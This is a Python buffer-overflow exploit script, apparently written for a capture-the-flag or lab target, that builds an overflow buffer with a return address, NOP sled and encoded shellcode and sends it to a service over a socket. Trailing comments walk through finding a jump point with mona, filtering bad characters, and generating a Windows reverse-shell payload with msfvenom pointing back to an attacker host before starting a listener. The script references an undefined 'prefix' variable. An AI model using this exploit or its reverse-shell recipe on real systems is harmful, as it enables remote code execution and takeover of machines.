#!/usr/bin/env python3

import socket

# code works, gets exploit

ip = "10.10.19.214"
port = 31337
offset = 146
overflow = "A" * offset
retn = "\xbf\x16\x04\x08"
padding = "\x90" * 10
# 0x080414c3

shell =  ""
shell += "\xda\xc9\xd9\x74\x24\xf4\x5a\xb8\xd8\xf8\xe7\x1c"
shell += "\x31\xc9\xb1\x52\x31\x42\x17\x83\xea\xfc\x03\x9a"
shell += "\xeb\x05\xe9\xe6\xe4\x48\x12\x16\xf5\x2c\x9a\xf3"
shell += "\xc4\x6c\xf8\x70\x76\x5d\x8a\xd4\x7b\x16\xde\xcc"
shell += "\x08\x5a\xf7\xe3\xb9\xd1\x21\xca\x3a\x49\x11\x4d"
shell += "\xb9\x90\x46\xad\x80\x5a\x9b\xac\xc5\x87\x56\xfc"
shell += "\x9e\xcc\xc5\x10\xaa\x99\xd5\x9b\xe0\x0c\x5e\x78"
shell += "\xb0\x2f\x4f\x2f\xca\x69\x4f\xce\x1f\x02\xc6\xc8"
shell += "\x7c\x2f\x90\x63\xb6\xdb\x23\xa5\x86\x24\x8f\x88"
shell += "\x26\xd7\xd1\xcd\x81\x08\xa4\x27\xf2\xb5\xbf\xfc"
shell += "\x88\x61\x35\xe6\x2b\xe1\xed\xc2\xca\x26\x6b\x81"
shell += "\xc1\x83\xff\xcd\xc5\x12\xd3\x66\xf1\x9f\xd2\xa8"
shell += "\x73\xdb\xf0\x6c\xdf\xbf\x99\x35\x85\x6e\xa5\x25"
shell += "\x66\xce\x03\x2e\x8b\x1b\x3e\x6d\xc4\xe8\x73\x8d"
shell += "\x14\x67\x03\xfe\x26\x28\xbf\x68\x0b\xa1\x19\x6f"
shell += "\x6c\x98\xde\xff\x93\x23\x1f\xd6\x57\x77\x4f\x40"
shell += "\x71\xf8\x04\x90\x7e\x2d\x8a\xc0\xd0\x9e\x6b\xb0"
shell += "\x90\x4e\x04\xda\x1e\xb0\x34\xe5\xf4\xd9\xdf\x1c"
shell += "\x9f\x25\xb7\x26\x38\xce\xca\x56\xd7\x52\x42\xb0"
shell += "\xbd\x7a\x02\x6b\x2a\xe2\x0f\xe7\xcb\xeb\x85\x82"
shell += "\xcc\x60\x2a\x73\x82\x80\x47\x67\x73\x61\x12\xd5"
shell += "\xd2\x7e\x88\x71\xb8\xed\x57\x81\xb7\x0d\xc0\xd6"
shell += "\x90\xe0\x19\xb2\x0c\x5a\xb0\xa0\xcc\x3a\xfb\x60"
shell += "\x0b\xff\x02\x69\xde\xbb\x20\x79\x26\x43\x6d\x2d"
shell += "\xf6\x12\x3b\x9b\xb0\xcc\x8d\x75\x6b\xa2\x47\x11"
shell += "\xea\x88\x57\x67\xf3\xc4\x21\x87\x42\xb1\x77\xb8"
shell += "\x6b\x55\x70\xc1\x91\xc5\x7f\x18\x12\xe5\x9d\x88"
shell += "\x6f\x8e\x3b\x59\xd2\xd3\xbb\xb4\x11\xea\x3f\x3c"
shell += "\xea\x09\x5f\x35\xef\x56\xe7\xa6\x9d\xc7\x82\xc8"
shell += "\x32\xe7\x86"



buffer = prefix + overflow + retn + padding + shell

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print("Trying to connect")
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

# with application running run 
# !mona jmp -r esp -cpb "\x00\x07\x2e\xa0" --add all bad chars
# pick a jump point and change retn to this
# remember little endian is backwards
# msfvenom -p windows/shell_reverse_tcp LHOST=10.13.38.214 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
# add bad chars to msfvenom payload as well
# then replace the payload with this
# add padding as well with padding = "\x90" * 16
# start listener and execute